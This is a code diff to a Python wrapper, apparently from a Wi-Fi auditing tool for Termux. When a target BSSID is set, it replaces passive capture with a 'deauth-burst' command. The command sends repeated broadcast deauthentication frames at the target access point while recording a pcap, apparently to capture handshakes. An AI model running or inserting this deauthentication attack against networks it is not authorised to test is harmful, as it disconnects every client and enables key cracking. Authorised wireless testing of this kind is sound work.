@@ -194,47 +194,55 @@ class RtwmonAirodump(Dependency):
             device_path = Rtwmon._termux_device_path(info.get("bus"), info.get("address"))
 
         if self.target_bssid:
+            # Attack mode: use deauth-burst
             pcap_file = Configuration.temp(f"{self.output_file_prefix}.cap")
             # Clean old pcap
             if os.path.exists(pcap_file):
                 try: os.remove(pcap_file)
                 except: pass
+
+            try:
+                burst_interval_ms = int(float(getattr(Configuration, 'wpa_deauth_timeout', 2) or 2) * 1000)
+            except Exception:
+                burst_interval_ms = 2000
+            if burst_interval_ms < 200:
+                burst_interval_ms = 200
+
+            try:
+                burst_size = int(getattr(Configuration, 'num_deauths', 10) or 10)
+            except Exception:
+                burst_size = 10
+            if burst_size < 1:
+                burst_size = 1
             
-            backend_scan_cmd = [
+            backend_cmd = [
                 'python3', '-u', Rtwmon.RTWMON_PATH,
-                'scan',
-                '--channels', str(self.channel or 1),
-            ]
-            backend_rx_cmd = [
-                'python3', '-u', Rtwmon.RTWMON_PATH,
-                'rx',
+                'deauth-burst',
                 '--channel', str(self.channel or 1),
+                '--bssid', self.target_bssid,
+                '--target-mac', 'ff:ff:ff:ff:ff:ff',
                 '--pcap', pcap_file,
+                '--burst-size', str(burst_size),
+                '--burst-interval-ms', str(burst_interval_ms),
             ]
         else:
             # Scan mode
-            backend_scan_cmd = [
+            backend_cmd = [
                 'python3', '-u', Rtwmon.RTWMON_PATH,
                 'scan',
             ]
             
             if self.channel:
-                backend_scan_cmd.extend(['--channels', str(self.channel)])
+                backend_cmd.extend(['--channels', str(self.channel)])
             else:
-                backend_scan_cmd.extend(['--channels', '1-13']) # Default
+                backend_cmd.extend(['--channels', '1-13']) # Default
 
-        cmd = Rtwmon._wrap_termux_usb(backend_scan_cmd, device_path=device_path)
+        cmd = Rtwmon._wrap_termux_usb(backend_cmd, device_path=device_path)
         
         # Start process, redirect stderr to file, stdout to PIPE
         self.stderr_file = open(self.error_file, 'w')
         # We use subprocess.PIPE explicitly, although Process wrapper defaults to it if stdout=None
         self.pid = Process(cmd, stdout=subprocess.PIPE, stderr=self.stderr_file)
-        self.capture_pid = None
-        self.capture_stderr = None
-        if self.target_bssid:
-            rx_cmd = Rtwmon._wrap_termux_usb(backend_rx_cmd, device_path=device_path)
-            self.capture_stderr = Process.devnull()
-            self.capture_pid = Process(rx_cmd, stdout=Process.devnull(), stderr=self.capture_stderr)
         
         # Set non-blocking on stdout pipe
         try:
@@ -249,20 +257,10 @@ class RtwmonAirodump(Dependency):
     def __exit__(self, exc_type, exc_val, exc_tb):
         if self.pid:
             self.pid.interrupt()
-        if getattr(self, "capture_pid", None):
-            try:
-                self.capture_pid.interrupt()
-            except Exception:
-                pass
         if self.stdout_file:
             self.stdout_file.close()
         if self.stderr_file:
             self.stderr_file.close()
-        if getattr(self, "capture_stderr", None):
-            try:
-                self.capture_stderr.close()
-            except Exception:
-                pass
         
         # Check for errors if process exited
         if os.path.exists(self.error_file) and os.path.getsize(self.error_file) > 0:
